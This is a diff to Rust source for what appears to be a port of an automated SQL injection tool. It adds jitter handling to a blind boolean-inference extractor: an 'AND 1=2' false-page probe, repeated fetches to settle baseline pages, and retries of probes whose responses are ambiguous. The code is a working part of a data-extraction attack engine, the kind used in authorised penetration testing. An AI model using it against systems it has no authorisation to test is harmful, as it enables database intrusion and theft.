@@ -90,6 +90,11 @@ pub struct BlindExtractor<'a> {
     inj: Injection,
     /// The injection's true page (filtered); conditions compare against it.
     true_page: String,
+    /// Lazily fetched known-false page (AND 1=2 probe): the second model
+    /// the anomaly guard needs to tell "genuinely false" from "transient
+    /// junk" (port of the resembles-neither-model check upstream's jitter
+    /// harness exercises).
+    false_page: Option<String>,
     threshold: f64,
     seed: u64,
     qs: crate::queries::Dbms,
@@ -115,6 +120,41 @@ fn hex(s: &str) -> String {
     out
 }
 
+/// Fetch a MODEL page (true baseline / false model) under jitter: single
+/// fetches can land on a transient junk page, and a polluted model corrupts
+/// every later comparison. Re-fetch until two consecutive responses agree
+/// (ratio >= threshold), max 3 tries; the first page is the fallback.
+pub fn stable_page(
+    client: &Client,
+    conf: &Config,
+    param: &Param,
+    val: &str,
+    threshold: f64,
+) -> Option<String> {
+    let mut prev: Option<String> = None;
+    let mut first: Option<String> = None;
+    for _ in 0..3 {
+        let resp = client
+            .request(&build_request(conf, param, &val.to_string()))
+            .ok()?;
+        let page = filtered_page(&resp.body);
+        if let Some(p) = &prev {
+            if ratio(p, &page) >= threshold {
+                return Some(page);
+            }
+        }
+        if first.is_none() {
+            first = Some(page.clone());
+        }
+        prev = Some(page);
+    }
+    first
+}
+
+/// Re-requests for one probe when the response matches neither page model
+/// (transient junk). Keeps a single blip from flipping a bisection bit.
+const JITTER_RETRIES: u32 = 2;
+
 impl<'a> BlindExtractor<'a> {
     pub fn new(
         client: &'a Client,
@@ -133,6 +173,7 @@ impl<'a> BlindExtractor<'a> {
             param,
             inj,
             true_page,
+            false_page: None,
             threshold,
             seed: 0,
             qs,
@@ -168,14 +209,63 @@ impl<'a> BlindExtractor<'a> {
                 (v, Some(std::time::Duration::from_secs(self.conf.time_sec as u64)))
             }
         };
-        let resp = self
-            .client
-            .request(&build_request(self.conf, &self.param, &val))
-            .ok()?;
-        Some(match need {
-            Some(need) => resp.elapsed >= need,
-            None => ratio(&self.true_page, &filtered_page(&resp.body)) >= self.threshold,
-        })
+        // Anomaly guard (page mode): a response matching neither the true
+        // nor the false model is transient junk (gateway 5xx, WAF
+        // interstitial, maintenance page). Upstream rides these out with
+        // retrial + per-char re-validation; we re-request the same probe up
+        // to JITTER_RETRIES times and only then give up on the value - a
+        // flipped bit is worse than a skipped one.
+        let mut attempt = 0;
+        loop {
+            let resp = self
+                .client
+                .request(&build_request(self.conf, &self.param, &val))
+                .ok()?;
+            return Some(match need {
+                Some(need) => resp.elapsed >= need,
+                None => {
+                    let page = filtered_page(&resp.body);
+                    if ratio(&self.true_page, &page) >= self.threshold {
+                        true
+                    } else {
+                        let false_page = self.false_model()?;
+                        if ratio(&false_page, &page) >= self.threshold {
+                            false
+                        } else if attempt < JITTER_RETRIES {
+                            attempt += 1;
+                            continue;
+                        } else {
+                            self.log.push(
+                                "  inference aborted on persistent anomalous responses (matches neither true nor false model)"
+                                    .into(),
+                            );
+                            return None;
+                        }
+                    }
+                }
+            });
+        }
+    }
+
+    /// The known-false page model, fetched once on first use.
+    fn false_model(&mut self) -> Option<String> {
+        if let Some(p) = &self.false_page {
+            return Some(p.clone());
+        }
+        let val = match &self.signal {
+            InferSignal::Page => assemble(
+                self.conf,
+                &mut self.log,
+                &self.param,
+                &self.inj.boundary,
+                "AND 1=2",
+                30000,
+            ),
+            _ => return None,
+        };
+        let page = stable_page(self.client, self.conf, &self.param, &val, self.threshold)?;
+        self.false_page = Some(page.clone());
+        Some(page)
     }
 
     /// Bisect a non-negative integer expression with `expr > mid` probes
